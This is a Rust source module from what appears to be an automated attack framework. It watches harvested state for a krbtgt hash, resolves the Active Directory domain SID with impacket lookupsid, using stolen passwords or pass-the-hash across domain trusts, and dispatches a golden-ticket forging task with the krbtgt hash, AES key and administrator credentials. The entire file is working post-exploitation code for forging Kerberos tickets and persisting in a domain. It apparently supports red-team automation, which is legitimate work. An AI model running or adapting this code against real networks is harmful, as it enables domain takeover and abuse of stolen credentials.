//! auto_golden_ticket -- monitor for krbtgt hash and forge golden ticket.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{info, warn};

use crate::dispatcher::Dispatcher;

/// Monitors for krbtgt hash and triggers golden ticket forging.
/// Interval: 30s. Matches Python `_auto_golden_ticket`.
pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let state = dispatcher.state.read().await;

        // Skip if already have golden ticket
        if state.has_golden_ticket {
            continue;
        }

        // Skip if no domain admin yet
        if !state.has_domain_admin {
            continue;
        }

        // Look for krbtgt hash
        let krbtgt_hash = state
            .hashes
            .iter()
            .find(|h| h.username.to_lowercase() == "krbtgt");

        let krbtgt = match krbtgt_hash {
            Some(h) => h.clone(),
            None => continue,
        };

        let domain = if !krbtgt.domain.is_empty() {
            krbtgt.domain.clone()
        } else {
            match state.domains.first() {
                Some(d) => d.clone(),
                None => continue,
            }
        };

        // Domain SID: prefer cached value, resolve via lookupsid if missing.
        let mut domain_sid = state.domain_sids.get(&domain.to_lowercase()).cloned();

        // Look up a DC IP for this domain
        let dc_ip = state
            .domain_controllers
            .get(&domain.to_lowercase())
            .cloned();

        // Find the best credential for the domain: prefer plaintext, fall back to NTLM hash.
        let admin_cred = state
            .credentials
            .iter()
            .find(|c| {
                c.username.to_lowercase() == "administrator"
                    && c.domain.to_lowercase() == domain.to_lowercase()
            })
            .cloned();
        let admin_hash = state
            .hashes
            .iter()
            .find(|h| {
                h.username.to_lowercase() == "administrator"
                    && h.domain.to_lowercase() == domain.to_lowercase()
                    && h.hash_type.to_uppercase() == "NTLM"
            })
            .cloned();

        // Collect a password credential for SID lookup (any domain user will do).
        // Prefer a cred from the target domain, but fall back to any valid cred
        // since NTLM cross-domain auth works for lookupsid via trust relationships.
        let lookup_cred = state
            .credentials
            .iter()
            .find(|c| {
                c.domain.to_lowercase() == domain.to_lowercase()
                    && !c.password.is_empty()
                    && !state.is_credential_quarantined(&c.username, &c.domain)
            })
            .or_else(|| {
                state.credentials.iter().find(|c| {
                    !c.password.is_empty()
                        && !state.is_credential_quarantined(&c.username, &c.domain)
                })
            })
            .cloned();

        drop(state);

        // ── Resolve domain SID if not cached ────────────────────────────
        if domain_sid.is_none() {
            if let Some(ref target_ip) = dc_ip {
                let result = resolve_domain_sid(
                    &domain,
                    target_ip,
                    lookup_cred.as_ref(),
                    admin_hash.as_ref(),
                )
                .await;

                // Cache the resolved SID and admin name
                if let Some((ref sid, ref admin_name)) = result {
                    info!(domain = %domain, sid = %sid, admin = admin_name.as_deref().unwrap_or("Administrator"), "Domain SID resolved via lookupsid");
                    let op_id = { dispatcher.state.read().await.operation_id.clone() };
                    let reader = ares_core::state::RedisStateReader::new(op_id);
                    let mut conn = dispatcher.queue.connection();
                    if let Err(e) = reader
                        .set_domain_sid(&mut conn, &domain.to_lowercase(), sid)
                        .await
                    {
                        warn!(err = %e, "Failed to persist domain SID to Redis");
                    }
                    if let Some(ref name) = admin_name {
                        if let Err(e) = reader
                            .set_admin_name(&mut conn, &domain.to_lowercase(), name)
                            .await
                        {
                            warn!(err = %e, "Failed to persist admin name to Redis");
                        }
                    }
                    let mut state = dispatcher.state.write().await;
                    state.domain_sids.insert(domain.to_lowercase(), sid.clone());
                    if let Some(ref name) = admin_name {
                        state
                            .admin_names
                            .insert(domain.to_lowercase(), name.clone());
                    }
                }

                domain_sid = result.map(|(sid, _)| sid);
            }
        }

        let domain_sid = match domain_sid {
            Some(sid) => sid,
            None => {
                warn!(domain = %domain, "Cannot resolve domain SID — skipping golden ticket");
                continue;
            }
        };

        // Use cached RID-500 name, defaulting to "Administrator" when unknown.
        let admin_username = {
            let state = dispatcher.state.read().await;
            state
                .admin_names
                .get(&domain.to_lowercase())
                .cloned()
                .unwrap_or_else(|| "Administrator".to_string())
        };

        // ── Build and submit golden ticket task ─────────────────────────
        // Strip LM prefix if hash is in "lm:ntlm" format — ticketer expects
        // a single 32-char NTLM hex string, not the LM:NTLM pair.
        let ntlm_hash = match krbtgt.hash_value.rsplit_once(':') {
            Some((_, ntlm)) if ntlm.len() == 32 => ntlm.to_string(),
            _ => krbtgt.hash_value.clone(),
        };

        let mut payload = json!({
            "technique": "golden_ticket",
            "vuln_type": "golden_ticket",
            "domain": domain,
            "krbtgt_hash": ntlm_hash,
            "username": admin_username,
            "domain_sid": domain_sid,
        });
        if let Some(ip) = dc_ip {
            payload["dc_ip"] = json!(ip);
        }
        if let Some(ref cred) = admin_cred {
            payload["admin_password"] = json!(cred.password);
            payload["admin_domain"] = json!(cred.domain);
        }
        if let Some(ref hash) = admin_hash {
            payload["admin_hash"] = json!(hash.hash_value);
            payload["admin_domain"] =
                json!(admin_cred.as_ref().map_or(&hash.domain, |c| &c.domain));
        }
        if let Some(ref aes) = krbtgt.aes_key {
            payload["aes_key"] = json!(aes);
        }

        match dispatcher
            .throttled_submit("exploit", "privesc", payload, 1)
            .await
        {
            Ok(Some(task_id)) => {
                info!(task_id = %task_id, domain = %domain, "Golden ticket task dispatched");
                // Mark has_golden_ticket immediately to prevent re-dispatch.
                // The result processing will also confirm on task completion
                // (detects "Saving ticket in *.ccache" in tool output).
                if let Err(e) = dispatcher
                    .state
                    .set_golden_ticket(&dispatcher.queue, &domain)
                    .await
                {
                    warn!(err = %e, "Failed to set golden ticket flag after dispatch");
                }
            }
            Ok(None) => {}
            Err(e) => warn!(err = %e, "Failed to dispatch golden ticket"),
        }
    }
}

/// Resolve domain SID and RID-500 account name by calling `impacket-lookupsid`.
/// Returns `(domain_sid, Option<admin_name>)`. Tries password credential first,
/// then NTLM hash.
///
/// Uses the credential's own domain for NTLM auth (not the target domain) so
/// cross-domain trust authentication works — e.g. a `child.contoso.local`
/// cred can resolve the SID of `contoso.local` via its parent DC.
async fn resolve_domain_sid(
    _domain: &str,
    dc_ip: &str,
    password_cred: Option<&ares_core::models::Credential>,
    admin_hash: Option<&ares_core::models::Hash>,
) -> Option<(String, Option<String>)> {
    // Try password auth first — use the credential's native domain for auth
    if let Some(cred) = password_cred {
        let auth_domain = if cred.domain.is_empty() {
            _domain
        } else {
            &cred.domain
        };
        let args = json!({
            "domain": auth_domain,
            "username": cred.username,
            "password": cred.password,
            "dc_ip": dc_ip,
        });
        match ares_tools::privesc::get_sid(&args).await {
            Ok(output) => {
                let text = output.combined_raw();
                if let Some(sid) = ares_core::parsing::extract_domain_sid(&text) {
                    let admin_name = ares_core::parsing::extract_rid500_name(&text);
                    return Some((sid, admin_name));
                }
                warn!(auth_domain = %auth_domain, user = %cred.username, "lookupsid succeeded but no SID pattern found in output");
            }
            Err(e) => {
                warn!(err = %e, user = %cred.username, auth_domain = %auth_domain, "lookupsid with password failed");
            }
        }
    }

    // Fall back to hash auth — use the hash's native domain for auth
    if let Some(hash) = admin_hash {
        let auth_domain = if hash.domain.is_empty() {
            _domain
        } else {
            &hash.domain
        };
        let args = json!({
            "domain": auth_domain,
            "username": "Administrator",
            "hash": hash.hash_value,
            "dc_ip": dc_ip,
        });
        match ares_tools::privesc::get_sid(&args).await {
            Ok(output) => {
                let text = output.combined_raw();
                if let Some(sid) = ares_core::parsing::extract_domain_sid(&text) {
                    let admin_name = ares_core::parsing::extract_rid500_name(&text);
                    return Some((sid, admin_name));
                }
                warn!(auth_domain = %auth_domain, "lookupsid (hash) succeeded but no SID pattern found");
            }
            Err(e) => {
                warn!(err = %e, auth_domain = %auth_domain, "lookupsid with admin hash failed");
            }
        }
    }

    None
}
